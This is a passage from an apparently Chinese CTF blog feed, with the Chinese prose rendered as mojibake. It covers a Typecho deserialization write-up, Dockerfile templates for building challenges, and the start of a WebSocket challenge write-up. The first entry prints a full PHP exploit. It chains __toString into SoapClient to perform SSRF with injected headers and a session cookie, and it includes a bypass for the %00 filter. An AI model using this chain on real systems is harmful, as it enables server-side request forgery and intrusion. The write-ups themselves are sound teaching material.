alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›èƒ½çœ‹åˆ°é‡Œé¢çœŸæœ‰ä¸€<code>toString</code>å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/7fde6098850643129e2b2ff94b0814c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†åˆ°è¿™å°±ä¸çŸ¥é“æ€ä¹ˆåšäº†ï¼Œçœ‹äº†wpæ‰çŸ¥é“å¯ä»¥å°†<code>$this-&gt;_adapter</code>æ§åˆ¶ä¸º<code>Soapclient</code>ç±»è§¦å‘<code>Soapclient</code>åŸç”Ÿç±»çš„<code>__call</code>å‡½æ•°ä»è€Œå¯ä»¥è¿›è¡ŒSSRFï¼Œå¯ä»¥çœ‹ä¸Šé¢æœ€å¼€å§‹å†™çš„è¿™ä¸ªåŸç†ã€‚</p><p>æ‹ä¸€ä¸‹æ€è·¯ï¼š<br>æœ€å¼€å§‹æ˜¯ååºåˆ—åŒ–è§¦å‘__wakeupå‡½æ•°ï¼Œå®ä¾‹åŒ–å¯¹è±¡<code> $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</code>è¿™é‡Œå¯ä»¥å°†ç¬¬ä¸€ä¸ªå‚æ•°<code>$this-&gt;coincidence[&#39;hello&#39;]</code>æ§åˆ¶æˆä¸ºä¸€ä¸ªç±»ï¼Œåœ¨Typecho_Dbç±»ä¸­çš„<code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>è¿™ä¸ªåœ°æ–¹è§¦å‘<code>toString</code>å‡½æ•°ï¼Œç„¶åæ¥ç€è§¦å‘åŸç”Ÿç±»çš„<code>call</code>å‡½æ•°è¾¾åˆ°æ‰“SSRFçš„æ•ˆæœã€‚</p><p>expå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld_DB</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$coincidence</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;hello&#x27;</span>] = <span class="hljs-keyword">new</span> Typecho_Db_Query();<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;world&#x27;</span>] = <span class="hljs-string">&#x27;typecho_&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Db_Query</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sqlPreBuild</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_adapter</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&quot;Cookie: PHPSESSID=e1g1ch42pgkoa25uclhko75l10&quot;</span><br>        );<br>        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-string">&#x27;KK^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span> . join(<span class="hljs-string">&#x27;^^&#x27;</span>, <span class="hljs-variable">$headers</span>))));<br>        <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;action&#x27;</span>=&gt;<span class="hljs-string">&quot;SELECT&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bypass</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$newstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/00/&#x27;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>])) &#123;<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>] = preg_replace(<span class="hljs-string">&#x27;/s/&#x27;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-string">&quot;:&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$newstr</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = serialize(<span class="hljs-keyword">new</span> HelloWorld_DB());<br><span class="hljs-variable">$test</span> = urlencode(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = preg_replace(<span class="hljs-string">&#x27;/%00/&#x27;</span>,<span class="hljs-string">&#x27;%5c%30%30&#x27;</span>, <span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = bypass(urldecode(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$test</span>);<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œé¢è¿˜æœ‰ä¸ªå‘ï¼Œå°±æ˜¯ä¸Šé¢å¯ä»¥çœ‹åˆ°å®ƒè¿‡æ»¤äº†<code>%</code>ä½†æ˜¯expä¸­æœ‰å¾ˆå¤šæ˜¯<code>private</code>å±æ€§éœ€è¦ç”¨<code>%00</code>ä¸å¯è§å­—ç¬¦å¡«å……ï¼Œç„¶åå°±éœ€è¦ç”¨\00æ¥ä»£æ›¿%00ã€‚è¿™é‡Œè¿˜æœ‰ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>åœ¨ PHP5 æœ€æ–°çš„ CVS ä¸­ï¼Œ<br>æ–°çš„åºåˆ—åŒ–æ–¹å¼å«åš escaped binary string æ–¹å¼ï¼Œè¿™æ˜¯ç›¸å¯¹ä¸æ™®é€šé‚£ç§ non-escaped binary string æ–¹å¼æ¥è¯´çš„ï¼š<br>string å‹æ•°æ®ï¼ˆå­—ç¬¦ä¸²ï¼‰æ–°çš„åºåˆ—åŒ–æ ¼å¼ä¸ºï¼š<br>S:â€<length>â€œ:â€<value>â€œ;<br>å…¶ä¸­ <length> æ˜¯æºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œé <value> çš„é•¿åº¦ã€‚<length> æ˜¯éè´Ÿæ•´æ•°ï¼Œæ•°å­—å‰å¯ä»¥å¸¦æœ‰æ­£å·ï¼ˆ+ï¼‰ã€‚<value> ä¸ºç»è¿‡è½¬ä¹‰ä¹‹åçš„å­—ç¬¦ä¸²ã€‚<br>å®ƒçš„è½¬ä¹‰ç¼–ç å¾ˆç®€å•ï¼Œå¯¹äº ASCII ç å°äº 128 çš„å­—ç¬¦ï¼ˆä½†ä¸åŒ…æ‹¬ \ï¼‰ï¼ŒæŒ‰ç…§å•ä¸ªå­—èŠ‚å†™å…¥ï¼ˆä¸ s æ ‡è¯†çš„ç›¸åŒï¼‰ï¼Œå¯¹äº 128~255 çš„å­—ç¬¦å’Œ \ å­—ç¬¦ï¼Œåˆ™å°†å…¶ ASCII ç å€¼è½¬åŒ–ä¸º 16 è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œä»¥ \ ä½œä¸ºå¼€å¤´ï¼Œåé¢ä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«æ˜¯è¿™ä¸ªå­—ç¬¦çš„ 16 è¿›åˆ¶ç¼–ç ï¼Œé¡ºåºæŒ‰ç…§ç”±é«˜ä½åˆ°ä½ä½æ’åˆ—ï¼Œä¹Ÿå°±æ˜¯ç¬¬ 8-5 ä½æ‰€å¯¹åº”çš„16è¿›åˆ¶æ•°å­—å­—ç¬¦ï¼ˆabcdef è¿™å‡ ä¸ªå­—æ¯æ˜¯å°å†™ï¼‰ä½œä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œç¬¬ 4-1 ä½ä½œä¸ºç¬¬äºŒä¸ªå­—èŠ‚ã€‚ä¾æ¬¡ç¼–ç ä¸‹æ¥ï¼Œå¾—åˆ°çš„å°±æ˜¯ <value> çš„å†…å®¹äº†ã€‚</p></blockquote><p>æ™®é€šçš„åºåˆ—åŒ–å°så¯¹åº”çš„å°±æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œå¦‚s:3:â€%00a%00â€;<br>è€Œåºåˆ—åŒ–çš„å¤§Såˆ™å¯¹åº”çš„æ˜¯\åŠ ä¸Š16è¿›åˆ¶ï¼Œå¦‚S:2:â€\00a\00â€;</p><p>çœ‹ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment"># code...</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// echo serialize(new A);</span><br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/50c6c8766f1d4270ae64f8dc45af5f5c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†ä¸å¯è§å­—ç¬¦%00è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå°så˜æˆå¤§Sï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/2092e96a463a460abe46cd2a585f867f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å›åˆ°é¢˜ç›®ï¼Œè·¯ç”±åœ¨è¿™é‡Œ<br><img src="https://img-blog.csdnimg.cn/65f2eacd33b848149de828c57f356989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åå‘åŒ…å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/60b2d5ad37f240eabcb12fba0a913562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dockerå‡ºé¢˜</title>
    <link href="/2021/07/29/2021-7-30-docker/"/>
    <url>/2021/07/29/2021-7-30-docker/</url>
    
    <content type="html"><![CDATA[<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><blockquote><p>Docker ä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨ä¸­çš„åº”ç”¨éƒ½åº”è¯¥ä»¥å‰å°æ‰§è¡Œï¼Œè€Œä¸æ˜¯åƒè™šæ‹Ÿæœºã€ç‰©ç†æœºé‡Œé¢é‚£æ ·ï¼Œç”¨ upstart/systemd å»å¯åŠ¨åå°æœåŠ¡ï¼Œå®¹å™¨å†…æ²¡æœ‰åå°æœåŠ¡çš„æ¦‚å¿µã€‚ </p><p>å¯¹äºå®¹å™¨è€Œè¨€ï¼Œå…¶å¯åŠ¨ç¨‹åºå°±æ˜¯å®¹å™¨åº”ç”¨è¿›ç¨‹ï¼Œå®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±å¤±å»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œä»è€Œé€€å‡ºï¼Œå…¶å®ƒè¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚ </p></blockquote><h2 id="dockerfileæ¨¡æ¿"><a href="#dockerfileæ¨¡æ¿" class="headerlink" title="dockerfileæ¨¡æ¿"></a>dockerfileæ¨¡æ¿</h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-comment"># ç¬¬ä¸€è¡Œå†™è·Ÿç¬¬1ç‚¹ä¸­ä¸€æ ·çš„åŸºæœ¬é•œåƒ</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">14.04</span><br><span class="hljs-comment"># è¿™é‡Œå¯ä»¥å†™ä¸Šä½ çš„å§“å/æ˜µç§°</span><br><span class="hljs-keyword">MAINTAINER</span> yourname<br><span class="hljs-comment"># è¿™é‡Œå¯ä»¥å†™ä¸Šä½ çš„åˆ¶ä½œæ—¶é—´</span><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2018</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span><br><span class="hljs-comment"># ä½¿ç”¨utf-8ç¼–ç </span><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-comment"># å…ˆå†™ ä¿®æ”¹æº/æ›´æ–° ã€å¦‚æœå¿…é¡»çš„è¯ã€‘</span><br><span class="hljs-comment"># æ›¿æ¢æºï¼ˆè¿™é‡Œå¯ç”¨sedæˆ–è€…ç›´æ¥COPYä¸€ä¸ªå®Œæ•´çš„sources.listæ¥æ›¿æ¢ï¼‰</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.163.com\/ubuntu\//g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-comment"># è¿›è¡Œæ›´æ–°</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get update -y</span><br><span class="hljs-comment"># å°†ç¯å¢ƒå˜é‡è®¾ç½®ä¸ºéäº¤äº’çš„ ã€è¿™ä¸ªçœ‹ä¸ªäººã€‘</span><br><span class="hljs-keyword">ENV</span> DEBIAN_FRONTEND noninteractive<br><br><span class="hljs-comment"># å†å†™ å„ç§å®‰è£…</span><br><span class="hljs-comment"># å¦‚ å®‰è£…mysql</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -y install mysql-server</span><br><span class="hljs-comment"># å®‰è£…apache2</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install apache2</span><br><span class="hljs-comment"># å®‰è£…php7</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install php7 libapache2-mod-php7</span><br><span class="hljs-comment"># å®‰è£…phpæ‰©å±•</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get install -yqq php7-mysql php7-curl php7-gd php7-intl php-pear php7-imagick php7-imap php7-mcrypt php7-memcache php7-ming php7-ps php7-pspell php7-recode php7-snmp php7-sqlite php7-tidy php7-xmlrpc php7-xsl</span><br><br><span class="hljs-comment"># å† ä¿®æ”¹ä¸€äº›é…ç½®</span><br><span class="hljs-comment"># å¯¹äºæ–‡ä»¶ä¸­çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œå¤šä½¿ç”¨sedå‘½ä»¤</span><br><span class="hljs-comment"># ä¾‹å¦‚å»æ‰apache2çš„åˆ—ç›®å½•æ¼æ´</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/Options Indexes FollowSymLinks/Options None/&#x27;</span> /etc/apache2/apache2.conf</span><br><br><span class="hljs-comment"># ç„¶åæ‰æ˜¯å¤åˆ¶æ–‡ä»¶ï¼Œä¸æ¨èæŒ‚è½½å·</span><br><span class="hljs-comment"># ADDä¼šè‡ªåŠ¨è§£å‹å‹ç¼©åŒ…ï¼Œè€ŒCOPYä¸ä¼š</span><br><span class="hljs-keyword">ADD</span><span class="bash"> html.tgz /var/www</span><br><br><span class="hljs-comment"># å‰©ä¸‹ä¸€äº›æ“ä½œï¼ˆæƒé™è¦æ§åˆ¶å¥½ï¼‰</span><br><span class="hljs-comment"># ä¾‹å¦‚ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chown root:root /var/www/html/x.php</span><br><br><span class="hljs-comment"># start.shä¸ºå¼€æœºå¯åŠ¨è„šæœ¬ï¼Œé‡Œé¢åŒ…å«å®¹å™¨å¼€å¯åè¦å¯åŠ¨çš„å‘½ä»¤</span><br><span class="hljs-keyword">COPY</span><span class="bash"> start.sh /root/start.sh</span><br><span class="hljs-comment"># åŠ ä¸Šæ‰§è¡Œæƒé™</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /root/start.sh</span><br><span class="hljs-comment"># ä½¿ç”¨ENTRYPOINTè€Œä¸ä½¿ç”¨CMDï¼ˆCMDå®¹æ˜“å—runå‘½ä»¤æœ€åçš„å‘½ä»¤ç»™å½±å“ï¼‰</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> <span class="hljs-built_in">cd</span> /root; ./start.sh</span><br><span class="hljs-comment"># WEBå¼€æ”¾ç«¯å£é»˜è®¤ä¸º80ï¼Œä¸€èˆ¬ä¸ºä¸€ä¸ªï¼Œè‹¥æœ‰ç‰¹æ®Šæƒ…å†µï¼Œè¯·å†™æ˜</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br></code></pre></div></td></tr></table></figure><h2 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h2><p>è¿›å…¥ç»ˆç«¯</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -it id bash</span><br></code></pre></div></td></tr></table></figure><p>è¿›å…¥å®¹å™¨</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker exec -it &lt;å®¹å™¨ID&gt; /bin/bash<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -d -p æœ¬æœºç«¯å£:å®¹å™¨ç«¯å£ &lt;é•œåƒå&gt;</span><br></code></pre></div></td></tr></table></figure><p>æ‹·è´</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker cp [æœ¬åœ°è·¯å¾„] [container id]:[container è·¯å¾„]<br></code></pre></div></td></tr></table></figure><h2 id="é…ç¯å¢ƒ"><a href="#é…ç¯å¢ƒ" class="headerlink" title="é…ç¯å¢ƒ"></a>é…ç¯å¢ƒ</h2><p>è‡ªå·±å®‰è£…webç¯å¢ƒæ„Ÿè§‰å¥½éº»çƒ¦å‘€ï¼Œçœ‹äº†çœ‹ç½‘ä¸Šçš„è¿˜æœ‰åˆ«äººé…å¥½çš„é•œåƒ</p><p><img src="https://img-blog.csdnimg.cn/db76db3bd231413fad2d8f8858a623b2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‹‰äº†ç¬¬ä¸€ä¸ªçœ‹çœ‹ï¼Œä¸­é€”3306å¯èƒ½ä¼šè¢«å ç”¨killæ‰å°±è¡Œ</p><p><code>docker pull mattrayner/lamp</code></p><p><code>docker run  --name test-lamp  -p 12345:80 -p 3306:3306  -d mattrayner/lamp</code></p><p>è¿›å»çœ‹äº†ä¸€ä¸‹ï¼Œç¡®å®æ¯”è¾ƒé½å…¨ï¼Œä½†å°±æ˜¯æ‹‰é•œåƒçš„æ—¶å€™å®‰è£…å¤ªæ…¢äº†ã€‚ä½†dockerfileä¹Ÿå†™çš„ç®€å•ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">from</span> mattrayner/lamp<br><br><span class="hljs-keyword">MAINTAINER</span> KKfine<br><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2021</span>-<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-keyword">ADD</span><span class="bash"> ctfweb.tar.gz /var/www/html</span><br><br><span class="hljs-keyword">COPY</span><span class="bash"> hint.php /tmp</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;è®¾ç½®çš„flag&#x27;</span> &gt; /home/flaaag.txt &amp;&amp; rm -rf /var/www/html/* &amp;&amp; tar -zcvf ctfweb.tar.gz var/www/html</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cybrics</title>
    <link href="/2021/07/28/2021-7-28-cybrics/"/>
    <url>/2021/07/28/2021-7-28-cybrics/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h2><p>â€‹    é¢˜ç›®è€ƒçš„æ˜¯webscoketæœ‰å…³çš„æ¼æ´ï¼Œä¹Ÿå±äºæ˜¯çŸ¥è¯†ç›²åŒºäº†â€¦</p><h3 id="å…³äºwebsocket"><a href="#å…³äºwebsocket" class="headerlink" title="å…³äºwebsocket"></a>å…³äºwebsocket</h3><h4 id="åŸºæœ¬çŸ¥è¯†"><a href="#åŸºæœ¬çŸ¥è¯†" class="headerlink" title="åŸºæœ¬çŸ¥è¯†"></a>åŸºæœ¬çŸ¥è¯†</h4><blockquote><p>websocketç”¨çš„æ˜¯ws://å’Œ wss://ï¼Œé‚£ä¹ˆ WebSocket å’Œ HTTP æ˜¯ä»€ä¹ˆå…³ç³»å‘¢ã€‚WebSocket æ˜¯ HTML5  æ¨å‡ºçš„æ–°åè®®ï¼Œè·Ÿ HTTP åè®®å†…å®¹æœ¬èº«æ²¡æœ‰å…³ç³»ã€‚WebSocket æ˜¯æŒä¹…åŒ–çš„åè®®ï¼Œè€Œ HTTP  æ˜¯éæŒä¹…è¿æ¥ã€‚WebSocket æä¾›äº†å…¨åŒå·¥æ²Ÿé€šï¼Œä¿—ç§° Web çš„ TCP è¿æ¥ï¼Œä½† TCP é€šå¸¸å¤„ç†å­—èŠ‚æµï¼ˆè·Ÿæ¶ˆæ¯æ— å…³ï¼‰ï¼Œè€Œ  WebSocket åŸºäº TCP å®ç°äº†æ¶ˆæ¯æµã€‚WebSocket ä¹Ÿç±»ä¼¼äº TCP ä¸€æ ·è¿›è¡Œæ¡æ‰‹è¿æ¥ï¼Œè·Ÿ TCP ä¸åŒçš„æ˜¯ï¼ŒWebSocket æ˜¯åŸºäº HTTP åè®®è¿›è¡Œçš„æ¡æ‰‹ã€‚</p></blockquote><p>çœ‹ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 